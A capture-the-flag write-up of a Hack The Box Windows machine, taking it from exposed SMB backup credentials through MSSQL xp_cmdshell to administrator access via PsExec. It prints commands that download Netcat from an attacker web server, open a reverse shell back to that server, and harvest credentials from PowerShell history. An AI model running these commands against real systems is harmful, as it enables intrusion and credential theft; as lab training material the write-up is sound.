# Hack The Box - Windows Privilege Escalation via MSSQL and Exposed Credentials

## Overview

This write-up documents the exploitation path used to compromise a Windows machine during a Hack The Box challenge. The attack chain involved discovering exposed credentials within an SMB share, leveraging access to Microsoft SQL Server, obtaining remote code execution through `xp_cmdshell`, and ultimately escalating privileges to an administrative account.

## Objectives

* Perform service enumeration.
* Identify accessible SMB shares.
* Retrieve credentials from exposed configuration files.
* Gain access to Microsoft SQL Server.
* Execute operating system commands via `xp_cmdshell`.
* Establish a reverse shell.
* Perform local enumeration.
* Discover privileged credentials.
* Escalate privileges to Administrator.

---

# 1. Reconnaissance

The initial phase focused on identifying the operating system, exposed services, and available attack vectors.

```bash
nmap -sC -A -sV -O IP_ADDRESS
```

The scan revealed:

* A Windows operating system.
* Several exposed network services.
* Microsoft SQL Server running on the target.
* Additional information useful for enumeration.

---

# 1.1 SMB Enumeration

Since the target was identified as a Windows server, SMB enumeration was one of the first steps.

```bash
smbclient -N \\\\IP_ADDRESS
```

During the enumeration process, an accessible share named:

```text
backups
```

was discovered.

Accessing the share:

```text
\\\\IP_ADDRESS\\backups
```

revealed a configuration file named:

```text
prod.dtsconfig
```

The file contained SQL Server configuration data, including valid credentials that could be used to authenticate against the database server.

---

# 2. Accessing Microsoft SQL Server

Using the credentials obtained from the configuration file, authentication to the SQL Server was performed using Impacket's `mssqlclient.py`.

```bash
python3 mssqlclient.py USER:PASSWORD@IP_ADDRESS -windows-auth
```

The `-windows-auth` option was required to authenticate successfully.

After connecting, access to the SQL instance was obtained with sufficient privileges to interact with the server.

---

# 2.1 Enabling xp_cmdshell

The next step was enabling `xp_cmdshell`, a SQL Server feature that allows execution of operating system commands from within SQL Server.

```sql
enable_xp_cmdshell
```

To verify command execution:

```sql
xp_cmdshell "powershell -c cd C:\"
```

The successful execution confirmed that remote command execution was available.

---

# 2.2 Transferring Netcat to the Target

To obtain an interactive shell, a Windows version of Netcat was transferred to the target.

On the attacking machine:

1. Downloaded Netcat for Windows.
2. Created a directory to host the executable.
3. Started a simple HTTP server.

Example:

```bash
python3 -m http.server 443
```

---

## Downloading the Binary

From the SQL Server session:

```sql
xp_cmdshell "powershell -c cd C:\Users\USERNAME\Downloads; wget http://MY_SERVER_IP_ADDRESS/nc64.exe -outfile adobe.exe"
```

The binary was successfully downloaded to the target machine.

---

## Establishing a Reverse Shell

On the attacking machine:

```bash
nc -lvnp 443
```

On the target machine:

```sql
xp_cmdshell "powershell -c cd C:\Users\USERNAME\Downloads; .\nc64.exe -e cmd.exe MY_IP_ADDRESS 443"
```

Once executed, a reverse shell connection was established, providing interactive access to the Windows host.

---

# 3. Local Enumeration

After gaining shell access, the next objective was identifying privilege escalation opportunities.

Since the compromised account appeared to have elevated access, I decided to investigate user activity and command history.

The following file was examined:

```text
ConsoleHost_history.txt
```

During the review, a command containing administrative credentials was discovered.

---

# 4. Privilege Escalation

Using the recovered administrator credentials, Impacket's `psexec.py` was used to authenticate and obtain a privileged shell.

```bash
python3 psexec.py ADMINISTRATOR@IP_ADDRESS
```

After providing the valid credentials, a shell running with administrative privileges was obtained.

At this point, full system compromise was achieved.

---

# Tools Used

| Tool                 | Purpose                             |
| -------------------- | ----------------------------------- |
| Nmap                 | Service discovery and enumeration   |
| SMBClient            | SMB share enumeration               |
| Impacket MSSQLClient | SQL Server access                   |
| Netcat               | Reverse shell                       |
| Impacket PsExec      | Privileged remote access            |
| PowerShell           | Command execution and file transfer |

---

# Attack Path

```text
Nmap Scan
    ↓
SMB Enumeration
    ↓
Exposed Backup Share
    ↓
SQL Configuration File
    ↓
Credential Disclosure
    ↓
MSSQL Authentication
    ↓
xp_cmdshell
    ↓
Reverse Shell
    ↓
Local Enumeration
    ↓
Credential Discovery
    ↓
PsExec
    ↓
Administrator Access
```

---

# Alternative Approach

An alternative exploitation path could involve:

1. Achieving remote code execution.
2. Generating a Meterpreter payload using Metasploit.
3. Obtaining a Meterpreter session.
4. Running WinPEAS for automated enumeration.
5. Identifying privilege escalation vectors.
6. Using Evil-WinRM with recovered credentials.

Example workflow:

```text
Metasploit
    ↓
Meterpreter
    ↓
WinPEAS
    ↓
Credential Discovery
    ↓
Evil-WinRM
    ↓
Administrator Access
```

---

# Lessons Learned

* SMB shares frequently expose sensitive files and credentials.
* Configuration files often contain hardcoded credentials.
* `xp_cmdshell` can provide a powerful path to remote code execution.
* Command history files may reveal passwords or sensitive operational data.
* Thorough post-exploitation enumeration is essential for identifying privilege escalation opportunities.

## Conclusion

This machine demonstrated how a seemingly minor exposure, such as an accessible backup share, can lead to complete system compromise. By combining SMB enumeration, credential harvesting, SQL Server abuse, and local enumeration, it was possible to escalate privileges from an initial foothold to full administrative access.
